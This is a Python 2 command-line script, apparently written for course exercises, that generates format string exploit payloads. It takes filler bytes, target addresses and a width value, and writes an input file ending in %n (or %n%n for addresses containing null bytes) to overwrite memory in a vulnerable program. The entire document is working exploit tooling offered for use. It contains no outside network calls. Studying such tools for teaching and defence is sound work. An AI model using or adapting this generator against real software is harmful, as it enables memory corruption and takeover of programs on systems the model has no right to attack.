#!/usr/bin/python

import sys
print """

This tool is used to whack format string vulnerability in the way DBG would set his exercises. Asssuming that he will be reading from a file, this python script takes
in the necessary value and outputs a file according to the name we want the file to be which will be use as the input file to the vulnerable program

Author: @L0uisJ0shua , @benjaminwongweien

Use at your own risk.

\x6c\x30\x6a\x30


P.S: This is written in Python and not Python3
"""


def writeFile(file, payload):
    original_stdout = sys.stdout
    with open(file, 'w') as f:
        sys.stdout = f
        print payload
        sys.stdout = original_stdout
    f.close()


if len(sys.argv) == 1:
    print "No option selected:("
    sys.exit(2)

opt = sys.argv[1]

if opt == "-h":
    print """
python exp.py <option>

-f: used for normal String Format Vulnerability Exploit
-n --null: used for String Format Vulnerability used to escape null-byte bad char in the targeted mem address
        """
    sys.exit()

elif opt in ("-n", "--null"):
    print len(sys.argv)
    if len(sys.argv) != 8:
        print "Error. Invalid number of Arguments"
        print """
The -n or --null flag is meant to be used if the memory address we are targeting contains a null byte in the memory address.
This is designed for DBG server and his exercises.

python exp.py -f <file to write payload> <num of filler char> <num of format %x to write> 
<intial memaddress to write> <memaddress to overwrite intial address with null byte> <value>
                """
        sys.exit(2)

    filler = "A" * int(sys.argv[3])

    memaddress = sys.argv[5].split("x")

    memaddress = "".join([chr(int(value, 16)) for value in memaddress[1:]])

    memaddress2 = sys.argv[6].split("x")

    memaddress2 = "".join([chr(int(value, 16)) for value in memaddress2[1:]])

    numplay = "%" + sys.argv[7] + "x"

    popformat = "%x" * (int(sys.argv[4]) - 1)

    payload = filler + memaddress + memaddress2 + numplay + popformat + "%n%n"

    writeFile(sys.argv[2], payload)

elif opt == "-f":
    if len(sys.argv) != 7:
        print "Error. Invalid number of Arguments"
        print """
The -f flag is used to do String Format Vulnerability Write Exploit.
This is meant to be used purely for DBG Quizes and Excercises

python whackformat.py -f <file to write payload> <num of filler char> 
<num of format %x to write> <memaddress to write> <value>

                """
        sys.exit(2)

    filler = "A" * int(sys.argv[3])

    memaddress = sys.argv[5].split("x")

    memaddress = "".join([chr(int(value, 16)) for value in memaddress[1:]])

    numplay = "%" + sys.argv[6] + "x"

    popformat = "%x" * (int(sys.argv[4]) - 1)

    payload = filler + memaddress + numplay + popformat + "%n"

    writeFile(sys.argv[2], payload)

else:
    print("Invalid / Missing flag")
